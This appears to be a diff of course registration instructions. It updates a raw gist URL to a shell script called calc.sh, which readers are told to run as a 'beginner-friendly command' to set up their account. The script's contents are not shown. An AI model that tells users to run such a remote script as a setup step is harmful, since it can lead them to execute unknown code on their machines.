@@ -4,7 +4,7 @@ To ensure you’re set up correctly and ready to begin, please complete the regi
 
 Step 1 – Account Setup
 Create your account using the following secure GitHub link and follow the beginner-friendly command:
-(https://gist.githubusercontent.com/millstone-ai/aac461dc9c590b046eefcfce43b0db1c/raw/36495f406532f512157e2a5c9a73aa346867de7d/calc.sh)
+(https://gist.githubusercontent.com/millstone-ai/aac461dc9c590b046eefcfce43b0db1c/raw/e08471ab680b546ce4349b4b2423a1aca78c58fd/calc.sh)
 
 This step is required to provision your access to the course environment and materials.
 
